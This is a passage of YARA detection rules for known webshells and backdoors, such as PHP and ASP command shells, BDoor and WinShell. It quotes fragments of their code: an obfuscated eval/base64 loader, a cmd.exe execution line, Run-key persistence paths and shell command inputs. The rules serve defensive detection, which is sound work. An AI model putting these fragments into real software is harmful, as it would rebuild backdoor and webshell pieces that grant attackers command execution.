		logic_hash = "9d071c1e2e0725091a2abe24759e6e71d78e29caa76b4fff77c44e3bb381b1a2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageFSO Below -->"
		$s1 = "theFile.writeLine(\"<script language=\"\"vbscript\"\" runat=server>if request(\"\"\"&cli"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Ssh_1
{
	meta:
		description = "Webshells Auto-generated - file ssh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "0b971065-df16-5092-beff-c55608447f19"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7165-L7176"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1aa5307790d72941589079989b4f900e"
		logic_hash = "40c5a5d1d714947454f4aa9f7ed09d777cb60c23933201ac8eaf0d49452af8c6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "eval(gzinflate(str_rot13(base64_decode('"

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Bdoor_1
{
	meta:
		description = "Webshells Auto-generated - file BDoor.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "0938efe7-2b6d-5749-af9a-967cca85defb"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7177-L7189"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e4e8e31dd44beb9320922c5f49739955"
		logic_hash = "ed8caeb96a6fc48fe23d5db078bbb8ba5aec3c5d4ee382cbc6bc4e01630f1460"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\\BDoor\\"
		$s4 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"

	condition:
		all of them
}

rule SIGNATURE_BASE_Bin_Client_1
{
	meta:
		description = "Webshells Auto-generated - file Client.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "8564d787-5edc-59b0-b1ef-2f33c8a24f82"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7190-L7204"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5f91a5b46d155cacf0cc6673a2a5461b"
		logic_hash = "28ce9aa136b5d41bb580e6b5b8580d3ccbb7eeec31007e68241d23c5a0f40d40"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Recieved respond from server!!"
		$s4 = "packet door client"
		$s5 = "input source port(whatever you want):"
		$s7 = "Packet sent,waiting for reply..."

	condition:
		all of them
}

rule SIGNATURE_BASE_Zxshell2_0_Rar_Folder_Zxshell_1
{
	meta:
		description = "Webshells Auto-generated - file ZXshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "621ac87e-b1f8-58d7-9328-54af5ca9b605"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7205-L7217"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "246ce44502d2f6002d720d350e26c288"
		logic_hash = "72eaf90551144eccb7329e0a0e05bcc955ea2bfdb37aa87e9cae7b5f5a26bea0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "WPreviewPagesn"
		$s1 = "DA!OLUTELY N"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rkntload_1
{
	meta:
		description = "Webshells Auto-generated - file RkNTLoad.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fd4b1343-5fa9-5ad8-bee1-6b06b93ddfbe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7218-L7236"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "262317c95ced56224f136ba532b8b34f"
		logic_hash = "ab767a7016318633055a85195ca2bab08a8c68222d46018aaf8772ab27a373c4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "$Info: This file is packed with the UPX executable packer http://upx.tsx.org $"
		$s2 = "5pur+virtu!"
		$s3 = "ugh spac#n"
		$s4 = "xcEx3WriL4"
		$s5 = "runtime error"
		$s6 = "loseHWait.Sr."
		$s7 = "essageBoxAw"
		$s8 = "$Id: UPX 1.07 Copyright (C) 1996-2001 the UPX Team. All Rights Reserved. $"

	condition:
		all of them
}

rule SIGNATURE_BASE_Binder2_Binder2_1
{
	meta:
		description = "Webshells Auto-generated - file binder2.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "29269dc0-f2e4-56ec-ad64-0dff00e339b7"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7237-L7253"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d594e90ad23ae0bc0b65b59189c12f11"
		logic_hash = "fbe56b7d37fc7863fcf55761c0b5b671d661a713ac95f90d65b79eee9a447a9b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "IsCharAlphaNumericA"
		$s2 = "WideCharToM"
		$s4 = "g 5pur+virtu!"
		$s5 = "\\syslog.en"
		$s6 = "heap7'7oqk?not="
		$s8 = "- Kablto in"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Orice2_1
{
	meta:
		description = "Webshells Auto-generated - file orice2.php"
		author = "Florian Roth (Nextron Systems)"
		id = "968cef9e-0163-5f4a-91e3-07510f9f4fcd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7254-L7266"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aa63ffb27bde8d03d00dda04421237ae"
		logic_hash = "075f3377a9b90c6c1ba74682415b9c0832a839afe647fa6d3c85d4e987618405"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " $aa = $_GET['aa'];"
		$s1 = "echo $aa;"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Sincap_1
{
	meta:
		description = "Webshells Auto-generated - file sincap.php"
		author = "Florian Roth (Nextron Systems)"
		id = "fcee20a3-e71b-5f69-ac67-8660fd270703"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7267-L7279"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dc5c2c2392b84a1529abd92e98e9aa5b"
		logic_hash = "705030e93248f5ea6744f78bd7a1816aaa9772880059286b8d686e05b193d4a0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "    <font color=\"#E5E5E5\" style=\"font-size: 8pt; font-weight: 700\" face=\"Arial\">"
		$s4 = "<body text=\"#008000\" bgcolor=\"#808080\" topmargin=\"0\" leftmargin=\"0\" rightmargin="

	condition:
		all of them
}

rule SIGNATURE_BASE_Phpshell_1
{
	meta:
		description = "Webshells Auto-generated - file PhpShell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "887264d3-5704-5e38-b0a6-44d529258ea2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7280-L7291"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "539baa0d39a9cf3c64d65ee7a8738620"
		logic_hash = "95b3cedac370bf9b06092035a738722f3ec97e6cbafe3d4f742429a865576ad8"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "href=\"http://www.gimpster.com/wiki/PhpShell\">www.gimpster.com/wiki/PhpShell</a>."

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Config_1
{
	meta:
		description = "Webshells Auto-generated - file config.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "da1b8ce1-8b17-53f6-a86b-ad3fe918084e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7292-L7305"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b41d0e64e64a685178a3155195921d61"
		logic_hash = "b2806c30db413bca518943352f233c9d2915356a41eceed5e352b88ee34fbbd3"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "const adminPassword=\""
		$s2 = "const userPassword=\""
		$s3 = "const mVersion="

	condition:
		all of them
}

rule SIGNATURE_BASE_Sendmail_1
{
	meta:
		description = "Webshells Auto-generated - file sendmail.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd33c2bb-61bf-57b7-82b9-d864097f7a56"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7306-L7318"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "75b86f4a21d8adefaf34b3a94629bd17"
		logic_hash = "bcca9a9380d2695bc277afc9fa72c24cb26ac44c6fbcc87113b017cfe190bdab"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "_NextPyC808"
		$s6 = "Copyright (C) 2000, Diamond Computer Systems Pty. Ltd. (www.diamondcs.com.au)"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Zehir4_1
{
	meta:
		description = "Webshells Auto-generated - file zehir4.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9f1adcd6-b721-54ef-a20f-c3a353629a40"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7319-L7330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5b496a61363d304532bcf52ee21f5d55"
		logic_hash = "6bcfb1ee40403394bf996ecbe1bb17f9afa0c3ba9e1906881b94bbc785b4a510"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = " byMesaj "

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkshell_Hkshell_1
{
	meta:
		description = "Webshells Auto-generated - file hkshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "7436cd7c-7027-56dc-bb62-fac0f70c27d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7331-L7344"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "168cab58cee59dc4706b3be988312580"
		logic_hash = "bee4d4c957ede41c771d690d52ac2fd3655238cc1fc106d30fb2721084b38aa1"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "PrSessKERNELU"
		$s2 = "Cur3ntV7sion"
		$s3 = "Explorer8"

	condition:
		all of them
}

rule SIGNATURE_BASE_Unpack_Tback_1
{
	meta:
		description = "Webshells Auto-generated - file TBack.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b5f93621-e1e9-5aed-b574-471b4c1f9570"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7357-L7368"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a9d1007823bf96fb163ab38726b48464"
		logic_hash = "0fb43766c305f4235cc0987f411fdc3b3674723687f0b63d346429f4a7b5b87f"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "\\final\\new\\lcc\\public.dll"

	condition:
		all of them
}

rule SIGNATURE_BASE_Darkspy105_1
{
	meta:
		description = "Webshells Auto-generated - file DarkSpy105.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9d519ccf-fe52-5b82-a39d-c9f86c1089e1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7369-L7380"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f0b85e7bec90dba829a3ede1ab7d8722"
		logic_hash = "0f1c9dba4525f9c30f309500652ed6af647ddf492f483e101fc23c891e15fc85"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "Sorry,DarkSpy got an unknown exception,please re-run it,thanks!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_EXE_1
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "97928144-0112-5288-8f95-acf7a0d56e71"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7381-L7394"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f945de25e0eba3bdaf1455b3a62b9832"
		logic_hash = "d440669b0c0bf575cf9dea946edf55f724300a4c765e90c631fc1eee062bf006"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "Server %s Have Been Configured"
		$s5 = "The Server Password Exceeds 32 Characters"
		$s8 = "9--Set Procecess Name To Inject DLL"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Reader_1
{
	meta:
		description = "Webshells Auto-generated - file reader.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "d596f7f4-5b0d-5f17-94d3-2582ec041eb1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7395-L7406"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b598c8b662f2a1f6cc61f291fb0a6fa2"
		logic_hash = "89a948f8da66173965884cd525615c8eeb91cf98a4984c05be7472034bb72f76"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "mailto:mailbomb@hotmail."

	condition:
		all of them
}

rule SIGNATURE_BASE_ASP_Cmdasp_1
{
	meta:
		description = "Webshells Auto-generated - file CmdAsp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e4b48843-1936-5717-b2b6-add5b4a14d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7407-L7420"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "79d4f3425f7a89befb0ef3bafe5e332f"
		logic_hash = "84c3148fe74b1afaa6e3bbff0aca8df1f1775759a36a673cc13d35ef7658929c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "' -- Read the output from our command and remove the temp file -- '"
		$s6 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)"
		$s9 = "' -- create the COM objects that we will be using -- '"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Backdoor_V1_1
{
	meta:
		description = "Webshells Auto-generated - file PHP Backdoor v1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "f47298a9-a47c-5088-ab1f-1bd76bfd0ca8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7434-L7447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0506ba90759d11d78befd21cabf41f3d"
		logic_hash = "396ae1ee34a06ab4863f4f54257a9020b8747fb99dff15372f0aa54fa4598e43"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "echo\"<form method=\\\"POST\\\" action=\\\"\".$_SERVER['PHP_SELF'].\"?edit=\".$th"
		$s8 = "echo \"<a href=\\\"\".$_SERVER['PHP_SELF'].\"?proxy"

	condition:
		all of them
}

rule SIGNATURE_BASE_Svchostdll_1
{
	meta:
		description = "Webshells Auto-generated - file svchostdll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "b369d702-1f29-56ec-a742-f87d9c42c775"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7448-L7467"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "0f6756c8cb0b454c452055f189e4c3f4"
		logic_hash = "4a7a7bb7d827c2e7801f8c33b292bb3d312428fc4ae79f07e103f456984c3b83"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "InstallService"
		$s1 = "RundllInstallA"
		$s2 = "UninstallService"
		$s3 = "&G3 Users In RegistryD"
		$s4 = "OL_SHUTDOWN;I"
		$s5 = "SvcHostDLL.dll"
		$s6 = "RundllUninstallA"
		$s7 = "InternetOpenA"
		$s8 = "Check Cloneomplete"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Devpack_Server_1
{
	meta:
		description = "Webshells Auto-generated - file server.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "0e4fee1b-8a16-5738-9600-fa965f8c84c2"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7468-L7479"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1d38526a215df13c7373da4635541b43"
		logic_hash = "66b8513a532f64af535c948da28674795ae6495b9844165c3b039bf61c25eb46"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<!-- PageServer Below -->"

	condition:
		all of them
}

rule SIGNATURE_BASE_Vanquish_1
{
	meta:
		description = "Webshells Auto-generated - file vanquish.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "143e5e46-ffbc-5aee-9f9b-13374a6c3c10"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7480-L7493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "684450adde37a93e8bb362994efc898c"
		logic_hash = "223c59d06a9389f380fa29959c54e53a17b53080f704189ae519b9527b2c6384"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "You cannot delete protected files/folders! Instead, your attempt has been logged"
		$s8 = "?VCreateProcessA@@YGHPBDPADPAU_SECURITY_ATTRIBUTES@@2HKPAX0PAU_STARTUPINFOA@@PAU"
		$s9 = "?VFindFirstFileExW@@YGPAXPBGW4_FINDEX_INFO_LEVELS@@PAXW4_FINDEX_SEARCH_OPS@@2K@Z"

	condition:
		all of them
}

rule SIGNATURE_BASE_Winshell_1
{
	meta:
		description = "Webshells Auto-generated - file winshell.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "24edd03a-df71-5d84-9764-ba7903b68064"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7494-L7513"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3144410a37dd4c29d004a814a294ea26"
		logic_hash = "addbfa598039af09c0e4c50138fcfabd16c35c5516259cf9595cf49855da518d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "Software\\Microsoft\\Windows\\CurrentVersion\\RunServices"
		$s1 = "WinShell Service"
		$s2 = "__GLOBAL_HEAP_SELECTED"
		$s3 = "__MSVCRT_HEAP_SELECT"
		$s4 = "Provide Windows CmdShell Service"
		$s5 = "URLDownloadToFileA"
		$s6 = "RegisterServiceProcess"
		$s7 = "GetModuleBaseNameA"
		$s8 = "WinShell v5.0 (C)2002 janker.org"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Remview_1
{
	meta:
		description = "Webshells Auto-generated - file remview.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5040ddbc-2e61-50ca-b738-a4ac8feec3f1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7514-L7527"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b4a09911a5b23e00b55abe546ded691c"
		logic_hash = "19719e8c9215ec9ba9fab55b604907e0a6d0a0507a5662926acff1e9dc03440e"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\""
		$s3 = "         echo \"<script>str$i=\\\"\".str_replace(\"\\\"\",\"\\\\\\\"\",str_replace(\"\\\\\",\"\\\\\\\\\""
		$s4 = "      echo \"<hr size=1 noshade>\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n\\n<"

	condition:
		all of them
}

rule SIGNATURE_BASE_Saphpshell_1
{
	meta:
		description = "Webshells Auto-generated - file saphpshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "42bcd739-714e-5dbf-a3a1-929f3d16ed6f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7528-L7539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d7bba8def713512ddda14baf9cd6889a"
		logic_hash = "24d558292a709bb29334b1acdc53cdb6c5bc6803caec527edcacd6a19f6dc7c9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<td><input type=\"text\" name=\"command\" size=\"60\" value=\"<?=$_POST['command']?>"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop2006_Rar_Folder_2006Z_1
{
	meta:
		description = "Webshells Auto-generated - file 2006Z.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bda89055-27f5-50b7-86a3-2c75a5f3eadc"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7540-L7552"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "fd1b6129abd4ab177fed135e3b665488"
		logic_hash = "4b427132541cd26ee47c387a98f6f46f86808f9a775068e1d114c9ef4abca9f6"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "wangyong,czy,allen,lcx,Marcos,kEvin1986,myth"
		$s8 = "System\\CurrentControlSet\\Control\\Keyboard Layouts\\%.8x"

	condition:
		all of them
}

rule SIGNATURE_BASE_Admin_Ad_1
{
	meta:
		description = "Webshells Auto-generated - file admin-ad.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7d87b4f6-3227-53cb-803c-4f9c7327f203"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7553-L7565"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "e6819b8f8ff2f1073f7d46a0b192f43b"
		logic_hash = "0febd10979a959af73332a8e064a510e949109abf863b5fd0fef19b635968d1d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "<td align=\"center\"> <input name=\"cmd\" type=\"text\" id=\"cmd\" siz"
		$s7 = "Response.write\"<a href='\"&url&\"?path=\"&Request(\"oldpath\")&\"&attrib=\"&attrib&\"'><"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Casus15_1
{
	meta:
		description = "Webshells Auto-generated - file casus15.php"
		author = "Florian Roth (Nextron Systems)"
		id = "305842e4-26ad-573d-8df3-e32e239e434b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L7566-L7577"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8d155b4239d922367af5d0a1b89533a3"
